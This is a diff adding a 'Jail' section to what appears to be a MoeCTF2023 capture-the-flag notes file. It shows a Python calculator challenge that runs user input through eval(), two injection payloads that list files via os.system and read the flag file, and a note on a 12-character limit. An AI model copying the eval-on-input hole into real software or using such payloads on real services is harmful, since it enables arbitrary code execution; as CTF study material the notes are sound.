@@ -1033,6 +1033,23 @@ https://www.cnblogs.com/c1047509362/p/12806297.html
 
 # Misc
 
+# Jail
+
+### 1
+```python
+print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
+print("Enter your expression and I will evaluate it for you.")
+user_input_data = input("> ")
+print('calc Answer: {}'.format(eval(user_input_data)))
+```
+
+```python
+__import__('os').system('ls')
+open('flag').read()
+```
+### 2
+限制长度12
+
 
 ---
 # *相关wp*
